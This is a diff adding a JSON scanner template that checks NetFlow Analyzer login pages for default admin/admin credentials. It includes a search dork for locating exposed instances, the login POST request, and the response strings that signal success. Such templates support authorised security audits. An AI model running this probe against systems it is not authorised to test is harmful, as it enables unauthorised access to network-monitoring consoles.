@@ -1,0 +1,30 @@
+{
+    "name": "NetFlowAnalyzer_DefaultAuth",
+    "method": "POST",
+    "port": [
+        80
+    ],
+    "dork": "title=Login - Netflow Analyzer",
+    "suffix": [
+        "/apiclient/ember/j_security_check"
+    ],
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "data": {
+        "AUTHRULE_NAME": "Authenticator",
+        "clienttype": "html",
+        "ScreenWidth": "1680",
+        "ScreenHeight": "954",
+        "loginFromCookieData": "false",
+        "ntlmv2": "false",
+        "j_username": "admin",
+        "j_password": "admin",
+        "signInAutomatically": "on",
+        "uname": 0
+    },
+    "hits": [
+        "Apache Tomcat/@VERSION@ - Error",
+        "Invalid direct reference to form login"
+    ]
+}
